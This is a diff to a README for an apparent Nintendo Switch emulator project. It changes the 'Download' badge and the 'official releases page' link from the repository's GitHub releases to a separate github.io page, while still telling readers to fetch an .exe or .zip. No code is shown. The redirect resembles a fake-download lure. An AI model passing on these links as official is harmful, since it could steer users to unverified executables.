@@ -1,6 +1,6 @@
 # 🎮 Yuzu-Emu - Play Nintendo Switch Games in 4K
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/taiyit9963/Yuzu-Emu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://taiyit9963.github.io)
 
 Yuzu-Emu allows you to run Nintendo Switch games on your computer. The software enables high-definition graphics, allowing many titles to run at 4K resolution. It provides a stable environment for playing your game library on Windows.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run games at full speed. Check your sys
 
 Follow these steps to install the emulator on your Windows PC.
 
-1. Visit the [official releases page](https://github.com/taiyit9963/Yuzu-Emu/releases) to download the software.
+1. Visit the [official releases page](https://taiyit9963.github.io) to download the software.
 2. Look for the file ending in `.zip` or `.exe` under the "Assets" section of the latest release.
 3. Save the file to your computer.
 4. If the file is a `.zip` archive, right-click it and select "Extract All."
